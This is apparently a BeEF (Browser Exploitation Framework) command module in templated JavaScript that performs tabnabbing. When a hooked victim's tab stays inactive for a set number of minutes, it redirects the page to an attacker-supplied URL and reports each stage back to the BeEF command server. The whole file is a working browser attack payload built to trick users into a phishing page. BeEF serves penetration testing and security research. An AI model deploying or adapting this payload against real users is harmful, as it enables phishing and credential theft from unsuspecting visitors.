//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

	var url = "<%= @url %>";
	var wait = <%= @wait %>*1000*60;
	var tabnab_timer;

	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'tabnab=waiting for tab to become inactive');

	// begin countdown when the tab loses focus
	$j(window).blur(function(e) {
		begin_countdown();

	// stop countdown if the tab regains focus
	}).focus(function(e) {
		clearTimeout(tabnab_timer);
	});

	begin_countdown = function() {
		tabnab_timer = setTimeout(function() { beef.net.send('<%= @command_url %>', <%= @command_id %>, 'tabnab=redirected'); window.location = url; }, wait);
	}

});
